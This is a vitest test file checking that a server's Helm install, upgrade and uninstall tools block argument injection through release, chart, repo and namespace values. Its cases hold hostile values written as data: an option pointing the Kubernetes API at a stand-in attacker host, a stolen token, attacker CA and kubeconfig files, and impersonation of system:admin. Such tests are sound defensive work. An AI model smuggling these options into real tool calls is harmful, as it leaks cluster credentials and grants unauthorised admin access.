/**
 * The chart tool is a second command line with its own names for the options
 * that select a target, credentials and identity. Caller-supplied release,
 * chart and namespace values must not reach it as those options.
 */
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";

import { ServerHandle, expectBlocked, startServer } from "../helpers";

let server: ServerHandle;

beforeAll(async () => {
  server = await startServer();
});

afterAll(async () => {
  await server.close();
});

beforeEach(() => {
  server.reset();
});

const cases: Array<{ tool: string; args: Record<string, unknown> }> = [
  {
    tool: "install_helm_chart",
    args: {
      name: "--kube-apiserver=https://attacker.example/collect",
      chart: "nginx",
      repo: "https://charts.example",
      namespace: "default",
    },
  },
  {
    tool: "install_helm_chart",
    args: { name: "web", chart: "--kube-token=stolen", namespace: "default" },
  },
  {
    tool: "install_helm_chart",
    args: {
      name: "--kube-apiserver=https://attacker.example/collect",
      chart: "nginx",
      namespace: "default",
      useTemplate: true,
    },
  },
  {
    tool: "install_helm_chart",
    args: {
      name: "web",
      chart: "nginx",
      namespace: "default",
      useTemplate: true,
      repo: "--kube-ca-file=/tmp/attacker-ca",
    },
  },
  {
    tool: "upgrade_helm_chart",
    args: { name: "--kubeconfig=/tmp/attacker-kubeconfig", chart: "nginx", namespace: "default" },
  },
  {
    tool: "upgrade_helm_chart",
    args: { name: "web", chart: "--kube-as-user=system:admin", namespace: "default" },
  },
  {
    tool: "uninstall_helm_chart",
    args: { name: "--kube-as-user=system:admin", namespace: "default" },
  },
];

describe("chart-tool options cannot be selected by caller values", () => {
  for (const { tool, args } of cases) {
    it(`${tool} refuses ${JSON.stringify(args).slice(0, 90)}`, async () => {
      const outcome = await server.callTool(tool, args);

      await expectBlocked(server, outcome);
    });
  }
});
